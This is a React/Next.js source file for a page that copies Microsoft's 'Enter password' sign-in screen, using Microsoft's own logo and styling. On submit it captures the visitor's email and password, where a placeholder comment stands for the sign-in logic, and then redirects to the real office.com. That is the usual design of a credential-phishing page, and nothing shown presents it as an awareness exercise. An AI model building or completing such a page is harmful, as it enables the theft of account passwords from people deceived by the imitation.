"use client"

import { useState } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Input } from "../../components/ui/input"
import { Button } from "../../components/ui/button"
import { ChevronLeft } from "lucide-react"

export default function VerifyPage() {
  const [password, setPassword] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()
  const email = searchParams.get("email") || ""

  const handleBack = () => {
    router.push("/")
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    // Handle sign in logic here
    console.log("Signing in with:", email, password)
    
    // Redirect to Outlook
    window.location.href = "https://www.office.com/"
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center relative">
      {/* Background with blur */}
      <div 
        className="fixed inset-0 bg-cover bg-center"
        style={{
          backgroundImage: "url('/bg.png')",
          filter: "blur(4px)"
        }}
      />
      <div className="absolute inset-0 bg-white/30" />

      {/* Main content */}
      <div className="z-10 w-[440px] bg-white shadow-md p-11">
        <Image
          src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
          alt="Microsoft"
          width={108}
          height={24}
          className="mb-4"
        />

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="flex items-center text-sm mb-6 cursor-pointer group" onClick={handleBack}>
            <ChevronLeft className="h-5 w-5 mr-2 group-hover:bg-black/10 rounded-full" />
            <span>{email}</span>
          </div>

          <h2 className="text-2xl font-medium">Enter password</h2>
          
          <div>
            <Input
              type="password"
              placeholder={`Password for ${email}`}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="border-t-0 border-x-0 rounded-none px-0 py-2 text-base focus:border-b-black focus:ring-0"
            />
          </div>

          <div className="space-y-4 text-sm">
            <a href="#" className="text-[#0067b8] hover:text-[#004b85] hover:underline">
              Forgot password?
            </a>
          </div>

          <div className="flex justify-end pt-4">
            <Button 
              type="submit"
              className="bg-[#0067b8] hover:bg-[#004b85] text-white min-w-[108px] h-8 text-sm rounded"
            >
              Sign in
            </Button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 w-full p-2 flex justify-end space-x-4 text-xs">
        <a href="#" className="text-black hover:underline">Terms of use</a>
        <a href="#" className="text-black hover:underline">Privacy & cookies</a>
        <button className="text-black font-semibold tracking-[3px] mr-4">...</button>
      </footer>
    </div>
  )
}